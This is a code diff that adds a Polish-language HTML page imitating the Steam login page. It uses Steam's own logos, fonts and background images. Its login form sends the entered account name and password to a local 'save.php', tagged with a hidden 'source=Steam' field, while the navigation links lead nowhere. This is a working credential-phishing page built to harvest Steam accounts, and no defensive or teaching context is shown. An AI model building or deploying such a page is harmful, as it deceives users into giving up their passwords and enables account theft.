@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#171a21">
+  <title>Steam - Logowanie</title>
+  <link rel="shortcut icon" href="https://store.cloudflare.steamstatic.com/public/shared/images/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://steamcommunity-a.akamaihd.net/public/shared/css/motiva_sans.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Motiva Sans", Arial, sans-serif;
+      background: url('https://cdn.cloudflare.steamstatic.com/store/promo/summer2022/background_1.jpg') center center / cover no-repeat;
+      background-color: #1b2838;
+      color: #c7d5e0;
+    }
+
+    .topbar {
+      background-color: #171a21;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: white;
+      font-size: 14px;
+    }
+
+    .topbar .left, .topbar .right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .topbar a {
+      text-decoration: none;
+      color: white;
+    }
+
+    .topbar .install {
+      background-color: #5c7e10;
+      padding: 4px 10px;
+      border-radius: 2px;
+      font-weight: bold;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 60px);
+    }
+
+    .login-box {
+      background-color: #171a21;
+      padding: 30px;
+      border-radius: 5px;
+      display: flex;
+      box-shadow: 0 0 10px rgba(0,0,0,0.8);
+    }
+
+    .login-form {
+      margin-right: 40px;
+    }
+
+    h2 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #66c0f4;
+    }
+
+    label {
+      font-size: 12px;
+      color: #66c0f4;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 280px;
+      padding: 10px;
+      margin-bottom: 15px;
+      background-color: #32353c;
+      border: none;
+      color: white;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 12px;
+    }
+
+    .remember input {
+      margin-right: 8px;
+    }
+
+    button[type="submit"] {
+      width: 100%;
+      background: linear-gradient(to right, #06bfff, #2d73ff);
+      color: white;
+      border: none;
+      padding: 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .help {
+      margin-top: 10px;
+      font-size: 12px;
+    }
+
+    .help a {
+      color: #66c0f4;
+      text-decoration: none;
+    }
+
+    .qr-section {
+      text-align: center;
+    }
+
+    .qr-section label {
+      font-size: 12px;
+      color: #66c0f4;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    .qr-section img {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 10px;
+    }
+
+    .qr-section a {
+      font-size: 12px;
+      color: #66c0f4;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="left">
+      <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" height="25" alt="Steam Logo">
+      <a href="#">SKLEP</a>
+      <a href="#">SPOŁECZNOŚĆ</a>
+      <a href="#">INFORMACJE</a>
+      <a href="#">POMOC TECHNICZNA</a>
+    </div>
+    <div class="right">
+      <a href="#" class="install">Zainstaluj Steam</a>
+      <a href="#">zaloguj się</a>
+      <a href="#">język ▼</a>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="login-box">
+      <div class="login-form">
+        <h2>Logowanie</h2>
+        <form method="POST" action="save.php">
+          <input type="hidden" name="source" value="Steam">
+          <label for="username">ZALOGUJ SIĘ Z UŻYCIEM NAZWY KONTA</label>
+          <input type="text" name="username" id="username" placeholder="Nazwa konta" required>
+          <label for="password">HASŁO</label>
+          <input type="password" name="password" id="password" placeholder="Hasło" required>
+          <div class="remember">
+            <input type="checkbox" id="remember" checked> <label for="remember">Zapamiętaj mnie</label>
+          </div>
+          <button type="submit">Zaloguj się</button>
+          <div class="help">
+            <a href="#">Pomocy, nie mogę się zalogować</a>
+          </div>
+        </form>
+      </div>
+      <div class="qr-section">
+        <label>LUB ZALOGUJ SIĘ Z UŻYCIEM KODU QR</label>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://store.steampowered.com" alt="Kod QR">
+        <div>
+          <a href="#">Użyj aplikacji mobilnej Steam</a>, aby zalogować się za pomocą kodu QR.
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
